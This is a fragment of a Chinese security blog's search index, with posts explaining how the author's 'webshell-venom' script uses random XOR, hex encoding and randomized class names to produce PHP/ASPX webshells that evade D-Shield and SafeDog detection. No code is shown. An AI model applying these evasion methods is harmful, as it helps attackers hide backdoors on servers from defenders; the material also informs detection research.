对于以上方法还可以连环套用,以达到混淆的效果 自己写了个脚本,利用以上方法来无限生成免杀aspx的webshell 已经放到了自己的项目webshell_venom中 项目地址: https://github.com/yzddmr6/webshell-venom ","date":"2019-08-11","objectID":"/posts/webshell-venom-aspx/:8:0","series":null,"tags":["免杀","webshell-venom"],"title":"无限免杀D盾脚本之aspx","uri":"/posts/webshell-venom-aspx/#0x06-总结"},{"categories":["技术文章"],"content":" 自己三个月前在圈子发的文章，保存一下 ","date":"2019-08-11","objectID":"/posts/webshell-venom-1-0/:0:0","series":null,"tags":["免杀","webshell-venom"],"title":"利用随机异或无限免杀d盾","uri":"/posts/webshell-venom-1-0/#"},{"categories":["技术文章"],"content":"\r1 前言最近D盾更新了,在某司某圈也看到了不少免杀d盾免杀狗的一句话帖子 但是基本上只要放出来不到两天时间就加入查杀全家桶.最近一直在造各种车轮子 就想着其实可以写个脚本利用异或来fuzz出指定的字符 然后拼接出assert或者create_function等函数,来对抗waf的检测. ","date":"2019-08-11","objectID":"/posts/webshell-venom-1-0/:1:0","series":null,"tags":["免杀","webshell-venom"],"title":"利用随机异或无限免杀d盾","uri":"/posts/webshell-venom-1-0/#前言"},{"categories":["技术文章"],"content":"\r2 思路及实现","date":"2019-08-11","objectID":"/posts/webshell-venom-1-0/:2:0","series":null,"tags":["免杀","webshell-venom"],"title":"利用随机异或无限免杀d盾","uri":"/posts/webshell-venom-1-0/#思路及实现"},{"categories":["技术文章"],"content":"\r2.1 首先如何fuzz的问题先讲一个离散数学中的概念叫可逆 ,异或的运算就是具有可逆性的. 具体什么意思呢,就是说若ab=c，则有bc=a 所以只要把需要拼凑出来的字符串a跟随机取出来的符号b异或,然后出来的结果c就是需要跟b异或的内容. 举个例子 我们来echo一下字符a跟符号*异或的结果 是大写字母K 然后把大写K跟*异或 就出来了我们想要的a 那么也就是 a=K^* 但是在写的过程中问题来了 很多时候异或出来的字符是不可见的小方块 就需要把它编码 看了以前有一篇文章是用url编码 但是在实现过程中发现url编码也有一定概率出现不可表示的字符 那就开开心心上hex吧 最终成功拼接出来了assert 接下来就是写个字符串池子,用来存特殊符号,然后随机取出来进行异或,拼接想要的字符. 把它封装成函数 可以设置需要异或的字符串长度 其实也可以用中文甚至emoji表情来异或,但是考虑到乱码还有不同系统对表情的支持不同,就算了. 取出拼接好的assert,把get的数据传进去,就成了下面这样 哈,看来可以使用啦 接着是调用的问题,其实到了这个地步 不管你什么d盾安全狗已经认不出来函数里面写的什么意思了 但是他会根据函数的调用来检测拦截 如果这个时候直接调用的话会爆一级可疑函数. 既然做免杀肯定要0级了啦 放到类里面再调用就好了 接下来就是造轮子了 在脚本中为了增大waf识别的难度 类名方法名也随机化了. ","date":"2019-08-11","objectID":"/posts/webshell-venom-1-0/:2:1","series":null,"tags":["免杀","webshell-venom"],"title":"利用随机异或无限免杀d盾","uri":"/posts/webshell-venom-1-0/#首先如何fuzz的问题"},{"categories":["技术文章"],"content":"\r3 使用方法\r右键查看生成的源码 已经保存到同目录下1.php里面了 生成了十几个 附上过D截图 ","date":"2019-08-11","objectID":"/posts/webshell-venom-1-0/:3:0","series":null,"tags":["免杀","webshell-venom"],"title":"利用随机异或无限免杀d盾","uri":"/posts/webshell-venom-1-0/#使用方法"},{"categories":["技术文章"],"content":"\r4 最后","date":"2019-08-11","objectID":"/posts/webshell-venom-1-0/:4:0","series":null,"tags":["免杀","webshell-venom"],"title":"利用随机异或无限免杀d盾","uri":"/posts/webshell-venom-1-0/#最后"},{"categories":["技术文章"],"content":"\r4.1 脚本特点有三个一利用特殊符号异或达到迷惑waf的目的,并且因为每一次的拼接都是随机生成的,所以单单一个文件进了特征库也不用担心 二是利用类调用,类名函数名随机化,杀软分析起来可能跟普通的文件没有什么区别 三是没有assert eval create_function 等这些关键字,更为隐蔽. 因为是随手写的,所以代码比较糙,不过不要在意这些细节…… 只是提供了一个思路,其实大马也可以像这样写个免杀模版,下一篇文章再讲吧 虽然都是随机化,也没有assert eval 这种关键字,但是用的人多了当然脚本的免杀性也失效了,可以关注我的github: https://github.com/yzddmr6 以后更新的免杀脚本都会放在上面. 如果有什么讲的不对的地方还请大佬们多多包涵. ","date":"2019-08-11","objectID":"/posts/webshell-venom-1-0/:4:1","series":null,"tags":["免杀","webshell-venom"],"title":"利用随机异或无限免杀d盾","uri":"/posts/webshell-venom-1-0/#脚本特点有三个"},{"categories":["技术文章"],"content":"\r5 源码地址https://github.com/yzddmr6/webshell-venom ","date":"2019-08-11","objectID":"/posts/webshell-venom-1-0/:5:0","series":null,"tags":["免杀","webshell-venom"],"title":"利用随机异或无限免杀d盾","uri":"/posts/webshell-venom-1-0/#源码地址"},{"categories":null,"content":"\r0.1 Hi, I’m yzddMr6 👋 Team: @L3H_Sec @AntSwordProject Mail: yzddmr6#gmail.com ","date":"2019-08-02","objectID":"/about/:0:1","series":null,"tags":null,"title":"About Me","uri":"/about/#hi-im-yzddmr6-"},{"categories":null,"content":"\r九世\r1ue\r","date":"2019-08-02","objectID":"/friends/:0:0","series":null,"tags":null,"title":"友情链接","uri":"/friends/#"}]